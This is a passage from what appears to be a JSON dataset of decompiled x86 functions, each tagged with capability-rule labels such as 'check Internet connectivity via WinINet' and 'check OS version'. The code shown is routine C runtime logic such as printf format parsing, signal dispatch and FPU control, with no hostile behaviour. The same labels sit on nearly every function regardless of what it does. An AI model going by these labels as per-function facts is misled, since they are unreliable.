        "decompiled_code": "\nvoid __cdecl fcn.004058a8(int32_t *arg_8h)\n\n{\n    int32_t *arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    *(in_ECX + 3) = 0;\n    arg_ch = in_ECX + 1;\n    if (arg_8h == NULL) {\n        if (*0x57504c != 0) {\n            iVar2 = fcn.004043ef();\n            *in_ECX = iVar2;\n            *arg_ch = *(iVar2 + 0x4c);\n            in_ECX[2] = *(iVar2 + 0x48);\n            fcn.0040449e(iVar2, arg_ch);\n            fcn.00406280(*in_ECX, in_ECX + 2);\n            uVar1 = *(*in_ECX + 0x350);\n            if ((uVar1 & 2) != 0) {\n                return;\n            }\n            *(*in_ECX + 0x350) = uVar1 | 2;\n            *(in_ECX + 3) = 1;\n            return;\n        }\n        *arg_ch = *0x571f54;\n        iVar2 = *0x571f58;\n    }\n    else {\n        *arg_ch = *arg_8h;\n        iVar2 = arg_8h[1];\n    }\n    in_ECX[2] = iVar2;\n    return;\n}\n",
        "token_count": 327
    },
    "004058da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004058da(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00403e8b(&var_8h);\n    fcn.00403d55(0x5b);\n    arg_8h_00 = fcn.00403e8b(&var_10h);\n    fcn.00402eeb(arg_8h_00);\n    fcn.00403d55(0x5d);\n    if (**0x574458 == '@') {\n        *0x574458 = *0x574458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n        return arg_8h;\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 267
    },
    "004058e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004058e9(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 != NULL) && (*piVar1 == 0x5a4d)) && (piVar2 = *(piVar1 + 0x1e) + piVar1,  *piVar2 == 0x4550)) &&\n       (((piVar1 = 0x10b,  *(piVar2 + 6) == 0x10b && (0xe < piVar2[0x1d])) && (piVar2[0x3a] != 0)))) {\n        return 0x101;\n    }\n    return piVar1 & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "00405916": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00405916(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00402199();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a8b9c:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a8b9c;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.00403a35();\n                            *puVar4 = 0x16;\n                            fcn.004037ce();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 458
    },
    "0040592a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040592a(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00405970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405970(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            uVar2 = fcn.004037ce();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.00405fec(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "004059ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004059ca(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            uVar2 = fcn.004037ce();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.004028c4(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 344
    },
    "004059cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004059cf(int32_t param_1)\n\n{\n    if (*(param_1 + 0x404) == 0) {\n        return 0x200;\n    }\n    return *(param_1 + 0x400) >> 1;\n}\n",
        "token_count": 63
    },
    "00405a15": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405a15(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 84
    },
    "00405a24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405a24(uint arg_8h, uint arg_ch)\n\n{\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_4h;\n    \n    fcn.004058a8(arg_ch);\n    fcn.00406203(*var_ch, arg_8h, 0x8000);\n    if (var_4h != '\\0') {\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00405a47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a47(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int64_t iVar3;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0xffffffff;\n    }\n    if (arg_ch == NULL) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        uVar2 = 0xffffffff;\n    }\n    else {\n        iVar3 = fcn.0040418d(arg_8h);\n        *arg_ch = iVar3;\n        arg_ch[1] = iVar3 >> 0x20;\n        uVar2 = 0xffffffff;\n        if (iVar3 != -1) {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 230
    },
    "00405aab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405aab(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.00405a3d(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00405ae2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405ae2(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        uVar2 = fcn.004038a0(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x32), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 197
    },
    "00405b32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b32(uint *arg_8h)\n\n{\n    if (*(arg_8h + 1) != '\\0') {\n        fcn.00404179(*arg_8h);\n    }\n    *arg_8h = 0;\n    *(arg_8h + 1) = 0;\n    return;\n}\n",
        "token_count": 78
    },
    "00405b3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00405b3c(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    ushort uVar4;\n    \n    if ((*param_1[7] != 0) && (piVar1 = param_1[0xb],  0 < *piVar1)) {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[7];\n        *param_1[7] = puVar2 + 1;\n        return *puVar2;\n    }\n    pcVar3 = *(*param_1 + 0x1c);\n    (**0x578000)();\n    uVar4 = (*pcVar3)();\n    return uVar4;\n}\n",
        "token_count": 178
    },
    "00405c3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405c3b(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.00403a35();\n        *puVar6 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x004a0646:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x004a064a:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x004a064d:\n            cVar4 = fcn.004037d8(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x004a05f2:\n                arg_8h = 0x10;\n                goto code_r0x004a064d;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x004a0606;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x004a05da;\n                }\n            }\ncode_r0x004a0656:\n            cVar4 = fcn.004014ba();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405f65();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x004a0656;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x004a0606:\n            cVar4 = fcn.004052cc(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004061f9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x004a0656;\n            if (cVar4 == 'i') goto code_r0x004a0646;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.0040661d();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00403eb3();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x004a05f2;\n            }\n            goto code_r0x004a064a;\n        }\ncode_r0x004a05da:\n        cVar4 = fcn.00402117();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.004030cb();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x004a06eb;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a06eb:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.00405ef2(&uStack8, arg_ch, arg_14h, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.004041a6(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403d6e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2402
    },
    "00405c45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00405c45(uint arg_8h)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char extraout_CL;\n    uint8_t uVar6;\n    char cVar7;\n    int32_t iVar8;\n    int32_t unaff_EBP;\n    code *pcVar9;\n    uint *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f7a8, 0x24);\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x19) = 1;\n    iVar4 = *(unaff_EBP + 8);\n    if (8 < iVar4) {\n        if (iVar4 == 0xb) goto code_r0x004cb49c;\n        if ((iVar4 == 0xf) || ((0x14 < iVar4 && (iVar4 < 0x17)))) goto code_r0x004cb48f;\ncode_r0x004cb4c0:\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\ncode_r0x004cb4aa:\n        uVar5 = 0xffffffff;\n        goto code_r0x004cb60f;\n    }\n    if (iVar4 == 8) {\ncode_r0x004cb49c:\n        puVar2 = fcn.00406924();\n        *(unaff_EBP + -0x20) = puVar2;\n        if (puVar2 == NULL) goto code_r0x004cb4aa;\n        iVar3 = fcn.004cb363(iVar4, *puVar2);\n        if (iVar3 == 0) goto code_r0x004cb4c0;\n        ppcVar1 = iVar3 + 8;\n        cVar7 = '\\0';\n        *(unaff_EBP + -0x19) = 0;\n    }\n    else {\n        if (iVar4 != 2) {\n            if (iVar4 == 4) goto code_r0x004cb49c;\n            if (iVar4 != 6) goto code_r0x004cb4c0;\n        }\ncode_r0x004cb48f:\n        ppcVar1 = fcn.004cb2a2(iVar4);\n        cVar7 = extraout_CL;\n    }\n    *(unaff_EBP + -0x24) = ppcVar1;\n    *(unaff_EBP + -0x2c) = 0;\n    if (cVar7 != '\\0') {\n        fcn.00406505(3);\n        cVar7 = *(unaff_EBP + -0x19);\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x1a) = 0;\n    *(unaff_EBP + -4) = 0;\n    pcVar9 = *ppcVar1;\n    if (cVar7 != '\\0') {\n        uVar6 = *0x571ca8 & 0x1f;\n        pcVar9 = (pcVar9 ^ *0x571ca8) >> uVar6 | (pcVar9 ^ *0x571ca8) << 0x20 - uVar6;\n        cVar7 = *(unaff_EBP + -0x19);\n    }\n    *(unaff_EBP + -0x28) = pcVar9;\n    *(unaff_EBP + -0x1a) = pcVar9 == 0x1;\n    if (pcVar9 != 0x1) {\n        if (pcVar9 == NULL) {\n            if (cVar7 != '\\0') {\n                fcn.00401ce9(3);\n            }\n            fcn.004060dc(3);\n            pcVar9 = swi(3);\n            uVar5 = (*pcVar9)();\n            return uVar5;\n        }\n        if (((iVar4 == 8) || (iVar4 == 0xb)) || (iVar4 == 4)) {\n            *(unaff_EBP + -0x2c) = *(*(unaff_EBP + -0x20) + 4);\n            *(*(unaff_EBP + -0x20) + 4) = 0;\n            if (iVar4 == 8) {\n                iVar3 = fcn.004043ef();\n                *(unaff_EBP + -0x30) = *(iVar3 + 8);\n                iVar3 = fcn.004043ef();\n                *(iVar3 + 8) = 0x8c;\n                goto code_r0x004cb564;\n            }\n        }\n        else {\ncode_r0x004cb564:\n            if (iVar4 == 8) {\n                iVar8 = *0x5569fc * 0xc + **(unaff_EBP + -0x20);\n                iVar3 = *0x556a00 * 0xc + iVar8;\n                for (; *(unaff_EBP + -0x34) = iVar8,  iVar8 != iVar3; iVar8 = iVar8 + 0xc) {\n                    *(iVar8 + 8) = 0;\n                }\n                goto code_r0x004cb597;\n            }\n        }\n        **(unaff_EBP + -0x24) = *0x571ca8;\n    }\ncode_r0x004cb597:\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004cb5cc();\n    if (*(unaff_EBP + -0x1a) == '\\0') {\n        if (iVar4 == 8) {\n            iVar3 = fcn.004043ef();\n            (**0x578000)(8, *(iVar3 + 8));\n            (*pcVar9)();\n        }\n        else {\n            (**0x578000)(iVar4);\n            (*pcVar9)();\n            if ((iVar4 != 0xb) && (iVar4 != 4)) goto code_r0x004cb60d;\n        }\n        *(*(unaff_EBP + -0x20) + 4) = *(unaff_EBP + -0x2c);\n        if (iVar4 == 8) {\n            iVar4 = fcn.004043ef();\n            *(iVar4 + 8) = *(unaff_EBP + -0x30);\n        }\n    }\ncode_r0x004cb60d:\n    uVar5 = 0;\ncode_r0x004cb60f:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar5;\n}\n",
        "token_count": 1572
    },
    "00405c5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00405c5e(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    uint32_t var_20h;\n    uint var_4h;\n    \n    puVar4 = &var_20h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_20h = var_20h & 0xffff0000 | in_FPUControlWord;\n    uVar1 = fcn.004df708(in_FPUControlWord & 7999);\n    if (*0x573c4c < 1) {\n        in_MXCSR = 0;\n    }\n    else {\n        in_MXCSR = in_MXCSR & 0xffc0;\n    }\n    uVar2 = fcn.004df61d(in_MXCSR);\n    return uVar2 | ((((uVar2 & 0x3f) << 2 | uVar2 & 0xffffff00) << 6 | uVar1 & 0x3f) << 2 | uVar1 & 0x300) << 0xe |\n           uVar1;\n}\n",
        "token_count": 316
    },
    "00405c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405c90(code **arg_8h, code **arg_ch)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    char cVar3;\n    code **ppcVar4;\n    \n    ppcVar4 = arg_8h;\n    if (arg_8h != arg_ch) {\n        do {\n            pcVar2 = *ppcVar4;\n            if (pcVar2 != NULL) {\n                (**0x578000)();\n                cVar3 = (*pcVar2)();\n                if (cVar3 == '\\0') break;\n            }\n            ppcVar4 = ppcVar4 + 2;\n        } while (ppcVar4 != arg_ch);\n        if (ppcVar4 != arg_ch) {\n            if (ppcVar4 != arg_8h) {\n                ppcVar4 = ppcVar4 + -1;\n                do {\n                    if ((ppcVar4[-1] != NULL) && (pcVar2 = *ppcVar4,  pcVar2 != NULL)) {\n                        (**0x578000)(0);\n                        (*pcVar2)();\n                    }\n                    ppcVar1 = ppcVar4 + -1;\n                    ppcVar4 = ppcVar4 + -2;\n                } while (ppcVar1 != arg_8h);\n            }\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 310
    },
    "00405cd1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
